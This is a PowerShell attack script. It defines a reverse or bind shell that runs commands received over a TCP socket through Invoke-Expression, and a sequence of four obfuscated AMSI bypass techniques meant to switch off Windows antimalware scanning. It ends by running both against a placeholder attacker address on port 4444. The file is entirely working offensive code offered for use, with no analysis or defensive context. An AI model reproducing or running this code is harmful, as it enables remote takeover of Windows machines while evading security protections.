function expl_win
{
    [CmdletBinding(DefaultParameterSetName = "reverse")]
    Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName = "bind")]
        [String]$IPAddress,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "bind")]
        [Int]$Port,
        [Parameter(ParameterSetName = "reverse")]
        [Switch]$Reverse,
        [Parameter(ParameterSetName = "bind")]
        [Switch]$Bind
    )

    try
    {
        if ($Reverse)
        {
            Write-Verbose "Connecting to attacker $IPAddress`:$Port ..."
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        }
        if ($Bind)
        {
            Write-Verbose "Listening on port $Port ..."
            $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
            $listener.Start()
            $client = $listener.AcceptTcpClient()
            Write-Verbose "Client connected!"
        }

        $stream = $client.GetStream()
        $encoding = [System.Text.Encoding]::UTF8
        [byte[]]$bytes = 0..65535 | % { 0 }

        $banner = "Windows PowerShell running as user $env:username on $env:computername`r`n"
        $banner += "Copyright (C) Microsoft Corporation. All rights reserved.`r`n`r`n"
        $sendbytes = $encoding.GetBytes($banner)
        $stream.Write($sendbytes, 0, $sendbytes.Length)
        $stream.Flush()

        $prompt = "PS $(Get-Location)> "
        $sendbytes = $encoding.GetBytes($prompt)
        $stream.Write($sendbytes, 0, $sendbytes.Length)
        $stream.Flush()

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $data = $encoding.GetString($bytes, 0, $i)
            try
            {
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
            }
            catch
            {
                $sendback = "ERROR (exception): $($_.Exception.Message)`r`n"
            }
            $sendback2 = $sendback + "PS $(Get-Location)> "
            $x = ($error[0] | Out-String)
            $error.Clear()
            $sendback2 = $sendback2 + $x
            $sendbyte = $encoding.GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener) { $listener.Stop() }
    }
    catch
    {
        Write-Warning "General shell error: $($_.Exception.Message)"
        Write-Error $_
    }
}

# ==================== Multi‑stage AMSI bypass (tentativas sequenciais) ====================
function Invoke-MultiAmsiBypass
{
    $bypasses = @(
        {
            try {
                [Ref].Assembly.GetType('System.Management.Automation.' + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))), 'NonPublic,Static').SetValue($null, $true)
                return $true
            } catch { return $false }
        },
        {
            try {
                sET-ItEM ('V' + 'aR' + 'IA' + 'blE:1q2' + 'uZx') ([TYpE]("{1}{0}" -F 'F', 'rE')); (GeT-VariaBle ("1Q2U" + "zX") -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f 'Util', 'A', 'Amsi', '.Management.', 'utomation.', 's', 'System'))."g`etf`iElD"(( "{0}{2}{1}" -f 'amsi', 'd', 'InitFaile'), ( "{2}{4}{0}{1}{3}" -f 'Stat', 'i', 'NonPubli', 'c', 'c,'))."sE`T`VaLUE"(${n`ULl}, ${t`RuE})
                return $true
            } catch { return $false }
        },
        {
            try {
                [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f 'iUt', 'gement.A', "on.Am`s", 'stem.M', 'oma'))."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f 'am', 'tFa', "`siI"), ("{2}ubl{0}`,{1}{0}" -f 'ic', 'Stat', 'NonP'))."$(echo Se)t`Va$(echo LUE)"($(), $(1 -eq 1))
                return $true
            } catch { return $false }
        },
        {
            try {
                $a = [Ref].Assembly.GetTypes()
                foreach ($b in $a) {
                    if ($b.Name -like "*iUtils") { $c = $b }
                }
                $d = $c.GetFields('NonPublic,Static')
                foreach ($e in $d) {
                    if ($e.Name -like "*Failed") { $f = $e }
                }
                $f.SetValue($null, $true)
                return $true
            } catch { return $false }
        }
    )

    $success = $false
    for ($i = 0; $i -lt $bypasses.Count; $i++) {
        Write-Verbose "Trying AMSI technique $($i+1)..."
        if (& $bypasses[$i]) {
            Write-Verbose "Technique $($i+1) succeeded!"
            $success = $true
            break
        }
        else {
            Write-Verbose "Technique $($i+1) failed."
        }
    }
    if (-not $success) {
        Write-Warning "All AMSI bypass techniques failed. Shell may not work correctly."
    }
}

Invoke-MultiAmsiBypass
expl_win -Reverse -IPAddress 192.168.x.x -Port 4444
